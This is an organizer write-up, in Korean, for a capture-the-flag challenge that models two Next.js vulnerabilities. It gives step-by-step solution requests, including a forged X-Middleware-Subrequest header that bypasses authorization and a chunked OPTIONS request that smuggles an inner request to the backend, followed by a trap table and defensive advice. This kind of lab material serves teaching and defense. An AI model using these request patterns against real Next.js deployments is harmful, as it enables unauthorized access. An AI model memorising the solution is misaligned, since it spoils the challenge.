# Baby Next Door — Organizer Write-up

## 성격과 한계

- 표기: Easy
- 실제 체감: 중상급 이상
- 정적 LLM 답변, CVE 검색 결과 복붙, stateless exploit은 실패하도록 설계
- 충분한 도구·시간·black-box 실험 능력을 가진 AI까지 절대 차단한다고 보장할 수는 없음
- 참가자에게 소스나 이 private 저장소 접근권을 주면 AI 저항성은 사실상 사라짐

실제 취약 Next.js 패키지를 설치한 1:1 PoC가 아니라, 두 CVE의 신뢰 경계를 표준 Node.js로 축소 모델링한 CTF입니다.

## 상태 머신

```text
같은 HTTP/1.1 TCP 연결
  │
  ├─ 302 routing trace 관찰
  ├─ 동적 middleware node × budget으로 dashboard 우회
  ├─ ticket을 정하고 relay window 요청
  ├─ 103 Early Hints에서 window/session/동적 worker 관찰
  ├─ HMAC proof 계산
  ├─ proof trailer가 있는 OPTIONS/chunked carrier 전송
  └─ 같은 연결에서 one-shot result 회수
```

gateway만 host에 publish되고 FLAG는 backend 컨테이너에만 존재합니다.

## 1. 정적 Middleware payload를 버리기

`GET /dashboard`는 302를 반환합니다. body나 로그인 화면보다 응답 헤더가 중요합니다.

```http
HTTP/1.1 302 Found
Location: /login
X-Route-Trace: node=auth-4f18a90c1d2e; budget=5
```

source map에는 `middleware`라는 가짜 이름이 있으므로 공개 CVE payload인 `middleware` 다섯 번은 실패합니다. 실제 인스턴스의 node를 budget만큼 colon으로 반복합니다.

```http
X-Middleware-Subrequest: auth-4f18a90c1d2e:auth-4f18a90c1d2e:auth-4f18a90c1d2e:auth-4f18a90c1d2e:auth-4f18a90c1d2e
```

이 단계는 `CVE-2025-29927`의 “외부 입력이 내부 재귀 방지 헤더로 오인되어 Middleware가 생략되는” 신뢰 오류를 모델링합니다. node 자체는 CTF 안정 장치로 매 process 시작마다 달라집니다.

## 2. dashboard의 증거 연결

dashboard는 완성된 curl 명령 대신 다음 사실만 제공합니다.

- window → carrier → result가 같은 HTTP/1.1 연결이어야 함
- ticket은 16 random bytes의 lowercase hex
- window endpoint는 최종 204 전에 informational metadata를 보냄
- 여러 Link 중 `rel=preconnect`가 active worker
- proof는 window를 key로 하는 HMAC-SHA256
- carrier proof는 마지막 chunk trailer에 위치
- public relay는 `/public/*`로 고정됨

## 3. 103 Early Hints 수집

무작위 ticket을 정한 뒤, 지금까지 사용한 **동일 TCP 연결**에서 요청합니다.

```http
GET /api/relay/window?ticket=0123456789abcdef0123456789abcdef HTTP/1.1
Host: challenge
X-Middleware-Subrequest: <dynamic marker>
Connection: keep-alive
```

응답은 두 개입니다.

```http
HTTP/1.1 103 Early Hints
X-Relay-Window: 3f...32-hex...
X-Relay-Session: Qn...24-base64url...
X-Relay-Capability: 9a...64-hex...
Link: </internal/cache/decoy>; rel=preload
Link: </internal/dispatch/active-slug>; rel=preconnect

HTTP/1.1 204 No Content
```

일반 `fetch`는 최종 204만 보여주고 103의 metadata를 노출하지 않습니다. raw HTTP client나 1xx를 보존하는 도구가 필요합니다. window는 연결에 묶이고 5분 동안 유효하며 한 carrier만 무장시킵니다.

## 4. proof 계산

worker path의 basename을 `slug`라고 할 때:

```text
key     = hexdecode(X-Relay-Window)
message = UTF8(ticket) || 0x00 || UTF8(slug)
proof   = lowercase_hex(HMAC-SHA256(key, message))
```

`rel=preload`의 cache path는 decoy입니다. 그 path를 사용하면 outer carrier는 204를 반환하지만 mailbox side effect는 생기지 않습니다.

`X-Relay-Capability`는 gateway와 backend가 공유하는 deployment key로 `window/session/ticket/slug` 전체를 서명한 opaque 값입니다. 계산하거나 변형하지 말고 inner request에 그대로 전달합니다. 이것이 없으면 공격자가 임의 window와 self-consistent slug/proof를 만드는 우회가 가능해집니다.

## 5. state-bound request smuggling

inner request는 103에서 얻은 동적 worker와 metadata를 사용합니다.

```http
GET /internal/dispatch/<slug>?ticket=<ticket> HTTP/1.1
Host: backend
X-Relay-Window: <window>
X-Relay-Session: <session>
X-Relay-Capability: <capability>
X-Relay-Proof: <proof>
Connection: keep-alive

```

이 전체 byte sequence를 chunk data로 넣고, 같은 proof를 마지막 trailer에도 기록합니다.

```http
OPTIONS /api/relay/ping HTTP/1.1
Host: challenge
X-Middleware-Subrequest: <dynamic marker>
Transfer-Encoding: chunked
Trailer: X-Relay-Proof
Connection: keep-alive

<inner-byte-length-in-hex>
<complete inner request bytes>
0
X-Relay-Proof: <proof>

```

CRLF와 chunk byte length가 정확해야 합니다. gateway는 다음 조건이 모두 맞을 때만 desync branch를 활성화합니다.

- 같은 client TCP connection에 활성 window가 있음
- ticket/window/session이 해당 state와 일치
- method가 `OPTIONS` 또는 `DELETE`
- outer request가 chunked
- `Trailer: X-Relay-Proof` 선언과 final trailer가 모두 존재
- 마지막 `X-Relay-Proof` trailer가 정확함
- backend가 `X-Relay-Capability`로 window/session/ticket/worker 발급 진위를 검증
- window가 아직 사용되지 않음

활성화되면 gateway는 decoded body를 backend로 보내면서 `Content-Length: 0`을 선언합니다. backend는 body bytes를 두 번째 요청으로 해석합니다. 이는 `CVE-2026-29057`의 request boundary disagreement를 모델링합니다.

## 6. one-shot result

inner worker는 `ticket + session` mailbox에 FLAG를 90초간 저장합니다. 같은 client 연결에서 result를 읽습니다.

```http
GET /api/relay/result?ticket=<same ticket> HTTP/1.1
Host: challenge
X-Middleware-Subrequest: <dynamic marker>
Connection: close
```

gateway가 connection state의 session을 backend 요청에 주입합니다. 다른 연결, 다른 ticket, 이미 소비한 결과는 모두 동일한 404입니다.

## 함정 표

| 함정 | 결과 |
|---|---|
| source map의 `middleware` × 5 | 동적 node가 아니므로 302 |
| source map의 `baby-secret`, JWT `alg:none` | admin API 401/403 |
| `/admin/flag` | 형식은 맞지만 scoreboard에서 거부되는 honey flag |
| dashboard 없이 CVE 버전 검색 | 공개 surface에 정확한 버전 없음 |
| `fetch`로 window 요청 | 103 metadata가 사라지고 204만 보임 |
| 새 연결에서 carrier/result | connection state가 없어 404 |
| `rel=preload` Link | outer 204, side effect 없음 |
| GET/POST chunked | desync branch 비활성 |
| OPTIONS/DELETE + Content-Length | framing disagreement 없음 |
| proof를 일반 header에만 전송 | 마지막 chunk trailer가 아니므로 실패 |
| final trailer만 넣고 `Trailer` 선언 생략 | carrier가 무장되지 않음 |
| 임의 window에서 self-consistent worker/proof 생성 | capability 서명이 없어 backend 404 |
| 잘못된 HMAC, stale window, replay | 외부에서 구분되지 않는 실패 |
| Host 조작, traversal, double encoding | gateway allowlist에서 거부 |
| static `/internal/export` | legacy worker decoy, 실제 result 없음 |

scoreboard는 반드시 실제 flag와 exact match로 채점해야 합니다.

## CVE와 모델의 관계

- `CVE-2025-29927`: Middleware에만 둔 인가를 `x-middleware-subrequest` 신뢰 문제로 우회할 수 있었습니다. 공식 patched versions는 12.3.5, 13.5.9, 14.2.25, 15.2.3입니다.
- `CVE-2026-29057`: 외부 rewrite에서 crafted chunked `DELETE`/`OPTIONS`가 proxy/backend 요청 경계 불일치를 만들 수 있었습니다. affected range는 `>=9.5.0, <15.5.13` 및 `>=16.0.0-beta.0, <16.1.7`, patched versions는 15.5.13과 16.1.7입니다.

CTF 전용 차이:

- dynamic middleware node, 103 window, HMAC trailer, connection affinity, mailbox는 실제 CVE의 일부가 아닙니다.
- 실제 취약 dependency를 포함하지 않습니다.
- 이 문제의 성공은 특정 실제 Next.js 배포가 exploit 가능하다는 증거가 아닙니다.

## 방어 관점

- Middleware/Proxy만 보안 경계로 삼지 말고 민감 handler와 Data Access Layer에서 인가를 반복합니다.
- 지원되는 patched version으로 업그레이드합니다.
- 외부의 internal-use header를 edge에서 제거합니다.
- 모든 hop이 HTTP framing을 동일하게 처리하고 chunked `DELETE`/`OPTIONS` rewrite를 차단합니다.
- backend 내부 route도 네트워크 위치만 신뢰하지 말고 독립 인증을 적용합니다.

## 공식 출처

- [GHSA-f82v-jwr5-mffw / CVE-2025-29927](https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw)
- [Vercel: Postmortem on Next.js Middleware bypass](https://vercel.com/blog/postmortem-on-next-js-middleware-bypass)
- [GHSA-ggv3-7p47-pfv8 / CVE-2026-29057](https://github.com/vercel/next.js/security/advisories/GHSA-ggv3-7p47-pfv8)
- [NVD: CVE-2026-29057](https://nvd.nist.gov/vuln/detail/CVE-2026-29057)

동작하는 기준 구현은 `solver/solve.mjs`입니다.
